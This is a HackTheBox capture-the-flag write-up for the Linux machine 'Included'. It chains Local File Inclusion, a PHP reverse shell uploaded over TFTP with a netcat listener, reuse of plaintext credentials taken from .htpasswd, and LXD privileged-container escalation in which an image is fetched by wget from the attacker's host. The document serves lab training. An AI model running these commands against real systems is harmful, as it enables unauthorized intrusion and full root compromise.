# Included

**Platform:** HackTheBox  
**OS:** Linux  
**Difficulty:** Easy  
**Date:** April 2026

---

## Summary

Linux machine running a web server vulnerable to Local File Inclusion.
TFTP service allows uploading a PHP reverse shell which is then 
executed via LFI. Credentials found in a web server config file 
allow lateral movement to user mike. Privilege escalation achieved 
by abusing LXD group membership to mount the host filesystem inside 
a privileged container.

---

## 1. Reconnaissance

Port scan using nmap:

```bash
nmap -sU -sC -sV --top-ports 100 10.129.95.185
```

**Open ports:**

| Port | Service |
|------|---------|
| 80 | HTTP Apache 2.4.29 |
| 68 | DHCP |
| 69 | TFTP |

---

## 2. Local File Inclusion

Identified LFI vulnerability in the `file` parameter:
http://10.129.95.185/?file=/etc/passwd

Confirmed TFTP default directory from passwd file:
tftp:x:110:113:tftp daemon,,,:/var/lib/tftpboot

---

## 3. Remote Code Execution via TFTP

Created a PHP reverse shell and uploaded it via TFTP:

```bash
nano shell.php  # Set IP and port
tftp 10.129.95.185
put shell.php
quit
```

Started listener:

```bash
nc -lvnp 4444
```

Triggered the shell via LFI:
http://10.129.95.185/?file=/var/lib/tftpboot/shell.php

Upgraded to interactive shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

---

## 4. Lateral Movement

Found credentials in web server directory:

```bash
cd /var/www/html
ls -la
cat .htpasswd
# mike:Sheffield19
```

Switched to mike:

```bash
su mike
# Password: Sheffield19
```

Retrieved user flag:

```bash
cat /home/mike/user.txt
```

---

## 5. Privilege Escalation

Mike is a member of the **lxd** group which allows container abuse.

Built Alpine image on attacker machine:

```bash
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sudo ./build-alpine -a i686
```

Served the image via HTTP:

```bash
python3 -m http.server
```

Downloaded on target and imported:

```bash
wget 10.10.15.219:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
lxc image import ./alpine*.tar.gz --alias myimage
lxd init
```

Created privileged container with host filesystem mounted:

```bash
lxc init myimage mycontainer -c security.privileged=true
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
lxc start mycontainer
lxc exec mycontainer /bin/sh
```

Retrieved root flag:

```bash
chroot /mnt/root bin/sh
cat root/root.txt
```

---

## 6. Flags

- user.txt ✅
- root.txt ✅

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port and service enumeration |
| TFTP | File upload |
| php-reverse-shell | Remote code execution |
| netcat | Reverse shell listener |
| LXD | Privilege escalation via container |

---

## Vulnerabilities Found

| Vulnerability | Description |
|--------------|-------------|
| Local File Inclusion | file parameter allows reading system files |
| TFTP No Auth | Files uploaded without authentication |
| Plaintext Credentials | .htpasswd exposed in web directory |
| LXD Group Abuse | Privileged container mounts host filesystem |
